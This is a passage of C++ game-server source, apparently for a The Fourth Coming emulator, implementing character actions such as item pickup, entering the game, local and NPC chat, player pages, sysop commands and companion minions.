         if( !LastMoveWasBroadcasted())
         {

            TFCPacket sending;
            sending << (RQ_SIZE)__EVENT_OBJECT_MOVED;
            sending << (short)GetWL().X;
            sending << (short)GetWL().Y;     // where the player has moved (is now)
            PacketUnitInformation( sending );                
            SendPlayerMessage( sending );
            //Broadcast::BCast( tmp, _DEFAULT_RANGE, sending, GetInvisibleQuery() );	
         }
      }		
   }
   else
   {
      // If player is more than 2 seconds exhaust.
      if( newExhaust.move >= TFCMAIN::GetRound() + 2 SECONDS )
      {
         // Send a system message telling the player that he's exhaust.
         // This might flood a player with these messages if he keeps his finger on the move button.
         SendSystemMessage( _STR( 2776, GetLang() ) );
      }                
   }
}

void Character::StartGetObject(WorldPos wlPos,DWORD dwID)
{
   Lock();
   Unit *lpuGet;
   WorldMap *world = TFCMAIN::GetWorld( GetWL().world );
   if(world)
   {
      lpuGet = world->FindNearUnit( wlPos, dwID );
      if( lpuGet && lpuGet->GetType() == U_OBJECT )
      {
         wlPos = lpuGet->GetWL();
         // If the user is able to hold this item.
         if( can_get( wlPos, static_cast< Objects *>( lpuGet ) ) )
         {
            BOOL bproceed = TRUE;

            if(GetArenaID() >0 )  //Valid selon type de jeux...
            {
               if(GetArenaType() ==ARENE1_TYPE )
               {
                  if(lpuGet->GetStaticReference() == Arena1Master::GetSummonItemID(GetArenaID()-1))
                  {
                     Arena1Master::AddTakeList(GetPlayer(),lpuGet,GetArenaID()-1);
                     bproceed = FALSE;
                  }
               }
               else if(GetArenaType() ==ARENE2_TYPE )
               {
                  if(lpuGet->GetStaticReference() == Arena2Master::GetSummonItemID1(GetArenaID()-1))
                  {
                     Arena2Master::AddTakeList(0,GetPlayer(),lpuGet,GetArenaID()-1);
                     bproceed = FALSE;
                  }
                  else if(lpuGet->GetStaticReference() == Arena2Master::GetSummonItemID2(GetArenaID()-1))
                  {
                     Arena2Master::AddTakeList(1,GetPlayer(),lpuGet,GetArenaID()-1);
                     bproceed = FALSE;
                  }
               }
            }

            if(bproceed)
            {
               bool bCanGet = true;
               
               //CV:ITEM_TS --> Valid si un objet est locker a un user specifique... 
               if(theApp.dwShareXPDropEnable)
                  bCanGet = world->valid_link_id(wlPos, dwID,GetID());


               if(bCanGet)
               {
                  world->remove_world_unit( wlPos, dwID );

                  char lpszID[ 256 ];
                  strcpy_s( lpszID, 256, "UNDEFINED ID" );
                  Unit::GetNameFromID( lpuGet->GetStaticReference(), lpszID, U_OBJECT );


                  _LOG_ITEMS
                     LOG_MISC_1,
                        "Player %s (%s) got %u item %s ID( %s ) from ( %u, %u, %u ).",
                        (LPCTSTR)GetTrueName(),
                        (LPCTSTR)GetPlayer()->GetFullAccountName(),
                        static_cast<Objects*>(lpuGet)->GetQty(),
                        (LPCTSTR)lpuGet->GetName( _DEFAULT_LNG ),
                        lpszID,
                        wlPos.X,
                        wlPos.Y,
                        GetWL().world
                     LOG_

                  Broadcast::BCObjectRemoved( wlPos, _DEFAULT_RANGE_REMOVE,lpuGet->GetID()); //quand un objet ets recuperer

                  // Give item to character.
                  GetUnit( wlPos, lpuGet ,true);
               }
               else
               {
                  SendInfoMessage(_STR( 15512, GetLang() ),CL_YELLOW);
               }
            }
         }
      }
      else
      {
         //TFCPacket sending;
         //sending << (RQ_SIZE)RQ_MissingUnit;
         //sending << (long)dwID;
         //sending << (RQ_SIZE)RQ_GetObject;
         //SendPlayerMessage( sending );
      }
   }
   Unlock();
}

void Character::StartPutPlayerInGame()
{
   WorldPos player_pos = GetWL();

   DWORD dwFactionID = ViewFlag(__FLAG_PJ_VS_MONSTER_FRIENDLY);
   TFCPacket sending;
   sending << (short)RQ_PutPlayerInGame; // request 13;	
   sending << (char)0;
   sending << (long)dwFactionID;							
   sending << (long)GetID();							
   sending << (short)player_pos.X;
   sending << (short)player_pos.Y;
   sending << (short)player_pos.world;
   sending << (long)GetHP();
   sending << (long)GetMaxHP();
   sending << (short)GetMana();
   sending << (short)GetMaxMana();
   sending << (long)(GetXP() >> 32);
   sending << (long)GetXP();
   DWORD dwLevel = GetLevel();
   if( dwLevel >= MAX_LEVEL_XP )
      dwLevel = MAX_LEVEL_XP - 1;
   else if( dwLevel == 0 )
      dwLevel = 1;
   sending << (long)(Character::sm_n64XPchart[dwLevel] >> 32);
   sending << (long)Character::sm_n64XPchart[dwLevel];

   sending << (short)GetSTR();
   sending << (short)GetEND();
   sending << (short)GetAGI();
   sending << (short)0; // wil
   sending << (short)GetWIS();
   sending << (short)GetINT();
   sending << (short)GetLCK(); // lck
   sending << (char )TFCTime::Second();
   sending << (char )TFCTime::Minute();
   sending << (char )TFCTime::Hour();
   sending << (char )TFCTime::Week();
   sending << (char )TFCTime::Day();
   sending << (char )TFCTime::Month();
   sending << (short)TFCTime::Year();
   sending << (long)GetGold( );
   sending << (short)dwLevel;
   // last level xp
   sending << (long)(Character::sm_n64XPchart[dwLevel - 1] >> 32);
   sending << (long)Character::sm_n64XPchart[dwLevel - 1];

   int iWinter = 0;
   if(theApp.sGeneral.wServerEvents == 2)
      iWinter = 1;
   sending << (char)iWinter;


   if(GetPlayer()->IsGod())
      SetFlag(__FLAG_RPHRP_STATUS,1);

   GetPlayer()->m_dwXPLastTickCounter  = GetPlayer()->m_dwLastTickMove = GetTickCount();
   GetPlayer()->m_dwDPSLastTickCounter = GetPlayer()->m_dwLastTickMove = GetTickCount();
   GetPlayer()->m_XPCounter            = GetXP();
   GetPlayer()->m_DPSCounter           = 0;
   SetFlag(__FLAG_UNIT_COLOR,ViewFlag(__FLAG_UNIT_COLOR_OLD));

   //point crime
   int iCurTimeA = time(NULL);
   int iOffsetTimeA = iCurTimeA - ViewFlag(__FLAG_PLAYER_ARENE_BLOCK_TIME_FLAG);
   if(iOffsetTimeA > 604800) //une semaine en seconde == 604800    60sec*60min*24hrs *7jours
   {
      SetFlag(__FLAG_PLAYER_ARENE_BLOCK_TIME_FLAG,iCurTimeA);
      //remove PTS Crime
      int dwAreneBlock = ViewFlag(__FLAG_PLAYER_ARENE_BLOCK_VALUE_FLAG);
      dwAreneBlock--;
      if(dwAreneBlock <0)
         dwAreneBlock = 0;
      SetFlag(__FLAG_PLAYER_ARENE_BLOCK_VALUE_FLAG,dwAreneBlock);
   }
   

   if(theApp.m_dwPVPSyetem2Actif) //Supprime  un point honeur et crime toutes les semaine
   {
      //une semaine en seconde == 604800    60sec*60min*24hrs *7jours
      //si sa fait plus de 7 jours on vire un ptc...

      //point crime
      int iCurTimeC = time(NULL);
      int iOffsetTimeC = iCurTimeC - ViewFlag(__FLAG_NMS_LAST_CRIME_TIME);
      if(iOffsetTimeC > 604800)
      {
         SetFlag(__FLAG_NMS_LAST_CRIME_TIME,iCurTimeC);
         //remove PTS Crime
         int dwCrime = GetCrime();
         dwCrime--;
         if(dwCrime <0)
            dwCrime = 0;
         SetCrime(dwCrime);
      }

      //point honeur
      int iCurTimeH = time(NULL);
      int iOffsetTimeH = iCurTimeH - ViewFlag(__FLAG_NMS_LAST_HONOR_TIME);
      
      if(iOffsetTimeH > 604800)
      {
         SetFlag(__FLAG_NMS_LAST_HONOR_TIME,iCurTimeH);
         //remove PTS Crime
         int dwHonor = GetHonor();
         dwHonor--;
         if(dwHonor <0)
            dwHonor = 0;
         SetHonor(dwHonor);
      }
   }

   SendPlayerMessage( sending );
}

void Character::StartViewBackpack2(bool bAll, char chShow)
{
   TFCPacket sending;
   sending << (RQ_SIZE)RQ_ViewBackpack2;
   sending << (char)chShow;	// Of course player wants to view its backpack!
   sending << (long)GetID();
   PacketBackpack( sending);
   SendPlayerMessage( sending );

   if(bAll)
   {
      // Equiped items
      TFCPacket sendingE;
      packet_equiped( sendingE );
      SendPlayerMessage( sendingE );

      TFCPacket sendingS1;
      PacketStatus(sendingS1);
      SendPlayerMessage(sendingS1);
   }
}

void Character::StartAsyncEquipItem(unsigned long ulItemID)
{
   equip_object(ulItemID);
   TFCPacket sending;
   sending << (RQ_SIZE)(RQ_ViewBackpack2);
   sending << (char)0;	// Only update
   sending << (long)GetID();
   PacketBackpack( sending );
   SendPlayerMessage( sending );
   
   m_bAsyncEquipItem = false;
}

void Character::StartAsyncDirectTalk(CString strMessage,BYTE chDir, DWORD dwColor, DWORD dwID,WorldPos wlWhere)
{
   if(strMessage.GetLength() > 256)
   {
      _LOG_CHEAT
         LOG_MISC_1,
            "Player %s (IP:%s) TRY Crash RQ_DIRECTTALK, message > 256",
            (LPCTSTR)GetTrueName(),
            GetPlayer()->GetIP()
         LOG_
         return;

   }

   TFCPacket otherPacket;
   Unit *target;
   BOOL boProcess = TRUE;
   DWORD dwNameColor = CL_RED;


   WorldPos ppos = GetWL();
   WorldMap *world = TFCMAIN::GetWorld(ppos.world);
   if(world)
   {
      int Dist = pow((double)((int)ppos.X - (int)wlWhere.X),2.00) + pow((double)((int)ppos.Y - (int)wlWhere.Y),2.00);
      if (Dist < 120)
      { 
         if(  GetType() == U_OBJECT ) 
            dwNameColor = U_OBJECT_COLOR
         else if ( GetType() == U_NPC ) 
            dwNameColor = U_NPC_COLOR
         else if ( GetType() == U_PC ) 
         {
            dwNameColor = ViewFlag(__FLAG_UNIT_COLOR);
            if(!dwNameColor)
            {
               if(theApp.m_dwPVPSyetem2Actif == 1) //PVP SYSTEM
               {
                  if ( GetPlayer()->IsGod() ) 
                  {
                     dwNameColor = U_GOD_COLOR
                  }
                  else
                  {
                     if(GetPlayer()->self->GetCrime() == 0 && GetPlayer()->self->GetHonor() == 0)
                        dwNameColor = U_OBJECT_COLOR
                     else if(GetPlayer()->self->GetCrime() >= GetPlayer()->self->GetHonor())
                     dwNameColor = U_PC_COLOR
                     else
                     dwNameColor = U_PCRP_COLOR
                  }
               }
               else
               {
                  if ( GetPlayer()->IsGod() ) 
                     dwNameColor = U_GOD_COLOR
                  else if(GetPlayer()->self->ViewFlag(__FLAG_RPHRP_STATUS) == 1)
                     dwNameColor = U_PCRP_COLOR
                  else
                     dwNameColor = U_PC_COLOR
               }
            }
         }

         otherPacket << (RQ_SIZE)RQ_IndirectTalk;
         otherPacket << (long) GetID();
         otherPacket << (char) chDir;					
         otherPacket << (long) dwColor;
         otherPacket << (char)0; // not an NPC.


         if(chDir >= 0 && chDir <= 9)
         {
            int inbrChar = strMessage.GetLength();
            otherPacket << (strMessage);
            otherPacket << (GetName(GetLang()));
         }
         else
         {
            // Feedback client
            otherPacket << (short)0;
            otherPacket << (short)0;
            otherPacket << (long)dwNameColor;
            SendPlayerMessage( otherPacket );
            boProcess = FALSE;
         }
         otherPacket << (long)dwNameColor;
         const BYTE *lpMessageSent = (const BYTE *)strMessage.GetBuffer(0);
         
         // If the pre-translation function allows message to continue.
         if( PreTranslateInGameMessage( lpMessageSent ) )
         {
            // If user is god.
            if( GetPlayer()->IsGod(true) )
            {
               const BYTE *lpSysopMessage = lpMessageSent;
               bool boTalk = true;
               if( lpMessageSent[ 0 ] == '#' && strlen( reinterpret_cast< const char * >( lpMessageSent ) ) > 1 )
               {
                  lpSysopMessage = &lpMessageSent[1];
                  boTalk = false;
               }                        

               // Process sysop commands.
               boProcess = !SysopCmd::VerifySysopCommand( GetPlayer(), lpSysopMessage ); //Direct Talk
               if(!boTalk ) //NMNMNM_SANCTION
               {
                  boProcess = FALSE;
               }                        
            }

            if( boProcess )
            {
               // then shoot the talk to the targetted NPC
               target = world->FindNearUnit(wlWhere, dwID);

               // Broadcast sent message to allow all player to see talking.
               if(GetPlayer()->boCanTalk) //NMNMNM_SANCTION : envoie au autres uniquement si il peu parler sinon on send au NPC pour ne pas bloquer le PJ
                  Broadcast::BCast(GetWL(), theApp.m_dwLocalTalkRange, otherPacket);
               //message[i] = 0;	

               if( target != NULL )
               {
                  MultiLock( this, target );
                  // Set the player's target to the NPC that it is talking to
                  SetTarget( target );
                  Disturbed();
                  StopAutoCombat();
                  target->SendUnitMessage(MSG_OnTalk, target, NULL, this, static_cast< void * >( const_cast< BYTE * >( lpMessageSent ) ), NULL);

                  target->Unlock();
                  Unlock();

                  _LOG_TEXT
                     LOG_MISC_1,
                        "Player %s (talking to NPC %s) says '%s'.",
                        (LPCTSTR)GetTrueName(),
                        target->GetName( _DEFAULT_LNG ),
                        lpMessageSent
                     LOG_

               }
               else
               {
                  // send a break conversation
                  TFCPacket sending;
                  sending << (RQ_SIZE)RQ_BreakConversation;
                  SendPlayerMessage( sending );
               }


            }
            else
            {
               TFCPacket sending;
               sending << (RQ_SIZE)RQ_BreakConversation;
               SendPlayerMessage( sending );
            }
         }
      }
      else 
      { 
         TFCPacket sending;
         sending << (RQ_SIZE)RQ_BreakConversation;
         SendPlayerMessage( sending );
         SendSystemMessage(_STR( 15233, GetLang() ));
      }
   }
}

void Character::StartAsyncDirectTalkNoFeed(CString strMessage,BYTE chDir, DWORD dwColor, DWORD dwID,WorldPos wlWhere)
{
   if(strMessage.GetLength() > 256)
   {
      _LOG_CHEAT
         LOG_MISC_1,
         "Player %s (IP:%s) TRY Crash RQ_DIRECTTALK, message > 256",
         (LPCTSTR)GetTrueName(),
         GetPlayer()->GetIP()
         LOG_
         return;

   }

   Unit *target;
   BOOL boProcess = TRUE;
   DWORD dwNameColor = CL_RED;


   WorldPos ppos = GetWL();
   WorldMap *world = TFCMAIN::GetWorld(ppos.world);
   if(world)
   {
      int Dist = pow((double)((int)ppos.X - (int)wlWhere.X),2.00) + pow((double)((int)ppos.Y - (int)wlWhere.Y),2.00);
      if (Dist < 120)
      { 
         if(  GetType() == U_OBJECT ) 
            dwNameColor = U_OBJECT_COLOR
         else if ( GetType() == U_NPC ) 
         dwNameColor = U_NPC_COLOR
         else if ( GetType() == U_PC ) 
         {
            dwNameColor = ViewFlag(__FLAG_UNIT_COLOR);
            if(!dwNameColor)
            {
               if(theApp.m_dwPVPSyetem2Actif == 1) //PVP SYSTEM
               {
                  if ( GetPlayer()->IsGod() ) 
                  {
                     dwNameColor = U_GOD_COLOR
                  }
                  else
                  {
                     if(GetPlayer()->self->GetCrime() == 0 && GetPlayer()->self->GetHonor() == 0)
                        dwNameColor = U_OBJECT_COLOR
                     else if(GetPlayer()->self->GetCrime() >= GetPlayer()->self->GetHonor())
                     dwNameColor = U_PC_COLOR
                     else
                     dwNameColor = U_PCRP_COLOR
                  }
               }
               else
               {
                  if ( GetPlayer()->IsGod() ) 
                     dwNameColor = U_GOD_COLOR
                  else if(GetPlayer()->self->ViewFlag(__FLAG_RPHRP_STATUS) == 1)
                  dwNameColor = U_PCRP_COLOR
                  else
                  dwNameColor = U_PC_COLOR
               }
            }
         }
         const BYTE *lpMessageSent = (const BYTE *)strMessage.GetBuffer(0);

         // If the pre-translation function allows message to continue.
         if( PreTranslateInGameMessage( lpMessageSent ) )
         {
            // If user is god.
            if( GetPlayer()->IsGod(true) )
            {
               const BYTE *lpSysopMessage = lpMessageSent;
               bool boTalk = true;
               if( lpMessageSent[ 0 ] == '#' && strlen( reinterpret_cast< const char * >( lpMessageSent ) ) > 1 )
               {
                  lpSysopMessage = &lpMessageSent[1];
                  boTalk = false;
               }                        

               // Process sysop commands.
               boProcess = !SysopCmd::VerifySysopCommand( GetPlayer(), lpSysopMessage ); //Direct Talk
               if(!boTalk ) //NMNMNM_SANCTION
               {
                  boProcess = FALSE;
               }                        
            }

            if( boProcess )
            {
               // then shoot the talk to the targetted NPC
               target = world->FindNearUnit(wlWhere, dwID);

               if( target != NULL )
               {
                  MultiLock( this, target );
                  // Set the player's target to the NPC that it is talking to
                  SetTarget( target );
                  Disturbed();
                  StopAutoCombat();
                  target->SendUnitMessage(MSG_OnTalk, target, NULL, this, static_cast< void * >( const_cast< BYTE * >( lpMessageSent ) ), NULL);

                  target->Unlock();
                  Unlock();

                  _LOG_TEXT
                     LOG_MISC_1,
                     "Player %s (talking to NPC %s) says '%s'.",
                     (LPCTSTR)GetTrueName(),
                     target->GetName( _DEFAULT_LNG ),
                     lpMessageSent
                     LOG_

               }
               else
               {
                  // send a break conversation
                  TFCPacket sending;
                  sending << (RQ_SIZE)RQ_BreakConversation;
                  SendPlayerMessage( sending );
               }


            }
            else
            {
               TFCPacket sending;
               sending << (RQ_SIZE)RQ_BreakConversation;
               SendPlayerMessage( sending );
            }
         }
      }
      else 
      { 
         TFCPacket sending;
         sending << (RQ_SIZE)RQ_BreakConversation;
         SendPlayerMessage( sending );
         SendSystemMessage(_STR( 15233, GetLang() ));
      }
   }
}


void Character::StartAsyncPageTalk(CString strName,CString strMsg)
{
   if(strMsg.GetLength() > 256)
   {
      _LOG_CHEAT
         LOG_MISC_1,
         "Player %s (IP:%s) TRY Crash RQ_PAGE, message > 256",
         (LPCTSTR)GetTrueName(),
         GetPlayer()->GetIP()

         LOG_
         return;
   }
   
   CString strEmpty;
   strEmpty.Format("");

   if( GetPlayer()->CanPage() )
   {
      CString strPlayer;
      CString strMessage;
      GetPlayer()->PageNotification();
       
         
      strMessage = strMsg;
      strPlayer  = strName;
      strPlayer.TrimRight();
      strPlayer.TrimLeft();

      bool bSendPage = false;
      if( !strPlayer.IsEmpty() )
      {
         bool bCanPageInvisible = false;
         if( GetPlayer()->GetGodFlags() & GOD_CAN_SEE_ACCOUNTS )
            bCanPageInvisible = true;


         Players *lpPlayer;
         lpPlayer = CPlayerManager::GetCharacterRessource(strPlayer); //on lock apres le GEt...
         if(lpPlayer)
         {
            if(lpPlayer->in_game && (!lpPlayer->boWhoInvisible || bCanPageInvisible))
            {
               lpPlayer->Lock();
               //update le player name car possiblement pas complet...
               strPlayer.Format("%s",lpPlayer->self->GetTrueName());

               if( !lpPlayer->PageState() )
               {
                  strMessage.Format(_STR( 7125, GetLang() ),strPlayer);
                  SendSystemMessage( strMessage );
                  bSendPage = true;            
               }
               else
               {
                  //look, on permet de pager un GM en tout temps... meme si il est bloquer...
                  if( !GetPlayer()->boCanPage && lpPlayer->GetGodFlags() & GOD_CAN_REMOVE_SHOUTS)
                  {
                     strMessage = "<pages revoked>: " + strMessage;
                  }
                  else if(!GetPlayer()->boCanPage)
                  {
                     //page revoquer...
                     SendSystemMessage( _STR( 7172, GetLang() ) );
                     bSendPage = true;    
                  }

                  if(!bSendPage/* && lpPlayer->in_game*/)
                  {
                     TFCPacket sending;
                     sending << (RQ_SIZE)RQ_Page;			
                     sending << GetTrueName();
                     sending << strMessage;
                     lpPlayer->self->SendPlayerMessage( sending );

                     //send ack to senter...
                     CString strPlayerEcho;
                     TFCPacket sendingAck;
                     strPlayerEcho.Format("%s: %s",strPlayer,strMessage);
                     sendingAck << (RQ_SIZE)RQ_Page;
                     sendingAck << strEmpty;
                     sendingAck << strPlayerEcho;
                     SendPlayerMessage( sendingAck );

                     _LOG_PAGE
                        LOG_MISC_1,
                           "Player %s pages player %s, saying '%s'.",
                           (LPCTSTR)GetTrueName(),
                           (LPCTSTR)strPlayer,
                           (LPCTSTR)strMessage
                        LOG_     
                     bSendPage = true;
                  }
               }
               lpPlayer->Unlock();
            }
            CPlayerManager::FreePlayerResource(lpPlayer);
         }
      }
      if(!bSendPage)
      {
         // Player not found! Send null ack.
         TFCPacket sending;
         sending << (RQ_SIZE)RQ_Page;
         sending << strEmpty;
         sending << strEmpty;
         SendPlayerMessage( sending );
      }
   }
   else
   {
      // Notify the user that he cannot page right now.
      SendSystemMessage( _STR( 2777, GetLang() ) );
   }
}


void Character::StartAsyncIndirectTalk(CString strMessage,BYTE chDir, DWORD dwColor, DWORD dwID)
{
   if(strMessage.GetLength() > 256)
   {
      _LOG_CHEAT
         LOG_MISC_1,
         "Player %s (IP:%s) TRY Crash RQ_INDIRECTTALK, message > 256",
         (LPCTSTR)GetTrueName(),
         GetPlayer()->GetIP()
         LOG_
         return;
   }

   DWORD dwNameColor = CL_RED;

   GetPlayer()->NMTalkNotification();

   if(GetPlayer()->m_dwSpoofedID != 0)
      dwID = GetPlayer()->m_dwSpoofedID;

   if(  GetType() == U_OBJECT ) 
      dwNameColor = U_OBJECT_COLOR
   else if ( GetType() == U_NPC ) 
      dwNameColor = U_NPC_COLOR
   else if ( GetType() == U_PC ) 
   {
      dwNameColor = ViewFlag(__FLAG_UNIT_COLOR);
      if(!dwNameColor)
      {
         if(theApp.m_dwPVPSyetem2Actif == 1) //PVP SYSTEM
         {
            if ( GetPlayer()->IsGod() ) 
            {
               dwNameColor = U_GOD_COLOR
            }
            else
            {
               if(GetPlayer()->self->GetCrime() == 0 && GetPlayer()->self->GetHonor() == 0)
                  dwNameColor = U_OBJECT_COLOR
               else if(GetPlayer()->self->GetCrime() >= GetPlayer()->self->GetHonor())
                  dwNameColor = U_PC_COLOR
               else
                  dwNameColor = U_PCRP_COLOR
            }
         }
         else
         {
            if ( GetPlayer()->IsGod() ) 
               dwNameColor = U_GOD_COLOR
            else if(GetPlayer()->self->ViewFlag(__FLAG_RPHRP_STATUS) == 1)
               dwNameColor = U_PCRP_COLOR
            else
               dwNameColor = U_PC_COLOR
         }
      }
   }

   BOOL bAlreadySent = FALSE;
   //check complete name string...
   std::string strTmpSTD = strMessage.GetBuffer();
   if(theApp.CheckNMToolsCommand(GetPlayer(),chDir,strTmpSTD))
   {
      bAlreadySent = TRUE;
   }
   else
   {
      if(theApp.m_dwModeRPorHRP)
      {
         if( strMessage.GetLength() > 0 && strMessage[0] != '#')
         {
            if((ViewFlag(__FLAG_RPHRP_STATUS)==0 && chDir != 0xFE) || chDir == 0xFF)
            {
               std::string strNewMsg = "[ " + strMessage + " ]";
               strMessage = strNewMsg.c_str();
            }
            else
            {
               //Incremente the Rp phrase counter
               if(m_iRPPhase >=0)
               {
                  m_iRPTalkCnt++;      //i parle on incremente le cnt de talk
                  m_iRPNOTTalkCnt = 0; //il a parler on reset le cnt de not talk
               }
               
            }
         }
      }
   }


   BYTE *lpMessageSent = (BYTE *)strMessage.GetBuffer();

   Disturbed();
   if(!bAlreadySent)
   {
      //scan la liste des mot pour trouver
      //si le mot est un mot clee et si le joueur peu executer ce mot clef...

      if(AnalyseActionWorld((char*)lpMessageSent) == 666)
         return;

      if( GetPlayer()->IsGod(true) )
      {
         bool boSendFakeTalk = true;
         bool boSendTalk     = true;
         LPBYTE lpbSysopMessage = lpMessageSent;

         // If this character was appended.
         if( lpMessageSent[ 0 ] == '#' )
         {
            if( strlen( reinterpret_cast< const char * >( lpMessageSent ) ) > 0 )
            {
               lpbSysopMessage = &lpMessageSent[1];
               boSendTalk = false;
            }
         }

         // If this wasn't a sysop command
         if( SysopCmd::VerifySysopCommand( GetPlayer(), lpbSysopMessage ) == FALSE ) //Indirect Talk
         {

            // Send normal message
            if( GetPlayer()->boCanTalk && boSendTalk &&  chDir >= 0 && chDir <= 9)
            {
               CString m( lpMessageSent );
               if(GetArenaID() >0 && GetArenaTeam()>0)
               {
                  if(GetArenaType() == ARENE1_TYPE)
                     Arena1Master::SendMessageToTeam(GetTrueName(),GetArenaTeam(),m,GetArenaID()-1);
                  else if(GetArenaType() == ARENE2_TYPE)
                     Arena2Master::SendMessageToTeam(GetTrueName(),GetArenaTeam(),m,GetArenaID()-1);
               }
               else
               {
                  _LOG_TEXT
                     LOG_MISC_1,
                     "Player %s says '%s'.",
                     (LPCTSTR)GetTrueName(),
                     lpMessageSent
                     LOG_

                  if(GetPlayer()->in_game)
                  {
                     // Create a new packet
                     TFCPacket sending;
                     sending << (RQ_SIZE)RQ_IndirectTalk;
                     sending << (long)dwID;
                     sending << (char)chDir;
                     sending << (long)dwColor;
                     sending << (char)0; // not an NPC.
                     sending << m;
                     sending << GetName( GetLang() );
                     sending << (long)dwNameColor;

                     Broadcast::BCast( GetWL(), theApp.m_dwLocalTalkRange, sending );
                  }

                  boSendFakeTalk = false;
               }
            }
            else if (!boSendTalk) 
            {
               TFCPacket sending;
               CString csText;
               csText.Format("Invalid command: %s", lpMessageSent);
               sending << (RQ_SIZE)RQ_ServerMessage;
               sending << (short)30;
               sending << (short)3;
               sending << csText;
               sending << (long)CL_RED;
               GetPlayer()->Lock();
               SendPlayerMessage( sending );
               GetPlayer()->Unlock();
            }
         }
         if( boSendFakeTalk )
         {
           
         }
      }
      else
      {
         if( GetPlayer()->boCanTalk &&  chDir >= 0 && chDir <= 9)
         {

            CString m( lpMessageSent );
            if(GetArenaID() >0 && GetArenaTeam()>0)
            {
               if(GetArenaType() == ARENE1_TYPE)
                  Arena1Master::SendMessageToTeam(GetTrueName(),GetArenaTeam(),m,GetArenaID()-1);
               else if(GetArenaType() == ARENE2_TYPE)
                  Arena2Master::SendMessageToTeam(GetTrueName(),GetArenaTeam(),m,GetArenaID()-1);
            }
            else
            {
               _LOG_TEXT
                  LOG_MISC_1,
                  "Player %s says '%s'.",
                  (LPCTSTR)GetTrueName(),
                  lpMessageSent
                  LOG_

               if(GetPlayer()->in_game)
               {
                  // Create a new packet
                  TFCPacket sending;
                  sending << (RQ_SIZE)RQ_IndirectTalk;
                  sending << (long)dwID;
                  sending << (char)chDir;
                  sending << (long)dwColor;
                  sending << (char)0; // not an NPC.
                  sending << m;
                  sending << GetName( GetLang() );
                  sending << (long)dwNameColor;

                  Broadcast::BCast( GetWL(), theApp.m_dwLocalTalkRange, sending );
               }
            }
         }
         else
         {
         }
      }
   }
}

void Character::StartAsyncFromPregameToGame()
{
   TFCPacket sending;

   if( GetPlayer()->boPreInGame && !GetPlayer()->in_game )
   {
      char result = PutPlayerInGame( );

      CPlayerManager::GetChatter().AddToSystemChannels( GetPlayer() );
      if( !result )
      {
         GetPlayer()->in_game = TRUE;
         GetPlayer()->boPreInGame = FALSE;
		 GetPlayer()->boCanSave   = TRUE;
         ResetDeath();// If unit teleported, it cannot be dead.


         DeferredLoadEffects();

         if( ViewFlag( __FLAG_NUMBER_OF_REMORTS ) > 0 || ViewFlag( __FLAG_NMS_DECHU ) >0)
            BroadcastSeraphArrival();
         else
            BroadcastPopup( GetWL(), true );

         // Send the stats after the deferred load effects.
         {
            TFCPacket sendingS1;
            PacketStatus(sendingS1);
            SendPlayerMessage(sendingS1);

            TFCPacket sendingS2;
            PacketStatus2(sendingS2);
            SendPlayerMessage(sendingS2);
         }

         if( IsPuppet() )
         {                
            PacketPuppetInfo( sending );
            Broadcast::BCast( GetWL(), _DEFAULT_RANGE, sending, GetInvisibleQuery() );
         }            
      }
      else
      {
         _LOG_DEBUG
            LOG_WARNING,
            "****FAILED StartAsyncFromPregameToGame insert SystemCC character %s.",
            (LPCTSTR)GetTrueName()
            LOG_
      }
      WorldMap *wlWorld = TFCMAIN::GetWorld( GetWL().world );
      if( wlWorld )
      {
         if( !( GetPlayer()->GetGodFlags() & GOD_NO_MONSTERS ) )
         {
            wlWorld->VerifyInviewHives( GetWL() );
         }
      }

      sending.Destroy();
      sending << (RQ_SIZE)RQ_FromPreInGameToInGame;
      sending << (char)result;

      if( wlWorld != NULL )
      {
         // This is already sent when connecting. Before asking to go in-game, client asks for GetNearUnits, which send this packets.
         // wlWorld->packet_inview_units( user->self->GetWL(), sending, _DEFAULT_RANGE, user->self );
         SendPlayerMessage( sending );
      }
   }
   else
   {
      sending << (RQ_SIZE)RQ_FromPreInGameToInGame;
      sending << (char)1; // user already in game
      SendPlayerMessage( sending );		
      WorldMap *wlWorld = TFCMAIN::GetWorld( GetWL().world );

      if( wlWorld != NULL )
      {
         wlWorld->packet_inview_units( GetWL(), sending, _DEFAULT_RANGE, GetPlayer()->self );
         SendPlayerMessage( sending );
      }
   }
}



void Character::ShowMinion(bool bShow)
{
   try
   {

      int   iShow = ViewFlag(__FLAG_MINIONS_DISPLAYED);
      DWORD dwID  = ViewFlag(__FLAG_MINIONS_MONSTERID);

      if(iShow == 1 && bShow) //deja visible
         return;
      if(!iShow == 1 && !bShow)//deja cacher
         return;

      if(bShow && GetNMCombatMode())
         return; //on peu pas afficher le minion en combat

      if(dwID == 0 || dwID  >65535)
      {
         m_dwCompagnonID = 0;
         SetFlag(__FLAG_MINIONS_MONSTERID,0);
         return;
      }





      if(!bShow)
      {
         //On flag le minion pour sa destruction
         SetFlag(__FLAG_MINIONS_DISPLAYED,0);
      }
      else
      {
         if(TFCMAIN::GetRound() < MinionLastCall + MinionMinTimeCall)
         {
            if(ViewFlag(__FLAG_MINIONS_CALL_FLOOD_CNT) == 0)
            {
               SetFlag(__FLAG_MINIONS_CALL_FLOOD_CNT,1);
               SendInfoMessage(_STR( 15368, GetLang() ),CL_YELLOW);

            }
            return;
         }
         if(m_strCompagnonName == "" || dwID != m_dwCompagnonID)
         {
            //c un nouveau compagnon...
            //on envoie une demande pour le nom...
            m_dwCompagnonID = dwID;
            m_strCompagnonName = "";

            SetFlag(__FLAG_MINIONS_CALL_FLOOD_CNT,0);
            MinionLastCall = TFCMAIN::GetRound();

            TFCPacket sending;
            sending << (RQ_SIZE)RQ_AskCompagnonName;
            SendPlayerMessage( sending );
            return;
         }

         //On ajoute le minion et le manage...

         WorldMap *wl = TFCMAIN::GetWorld( GetWL().world );
         if( wl == NULL )
            return ;
         WorldPos wlPos = wl->FindValidSpot( GetWL(), 3 ,true);
         if( wlPos.X == -1 || wlPos.Y == -1 || wlPos.world == -1 )
            return ;

         if( dwID != 0 )
         {
            Minions *lpNewMinions = new Minions(this);
            BOOL bOK = lpNewMinions->Create( U_MINIONS, dwID );
            if( bOK )
            {
               Unit*ThisMinion = wl->create_world_unit(U_PC, 0, wlPos, lpNewMinions);
               if(ThisMinion)
               {
                  lpNewMinions->SetMaxHP(1000);
                  lpNewMinions->SetHP(1000,true);
                  lpNewMinions->SetSpeed(100);
                  lpNewMinions->SetStatus(IS_MINIONS); //Minions
                  lpNewMinions->SetName(m_strCompagnonName);
                  lpNewMinions->SetClan(__CLAN_PEACE);
                  lpNewMinions->SetAgressivness(0);
                  ThisMinion->BroadcastPopup( ThisMinion->GetWL() );
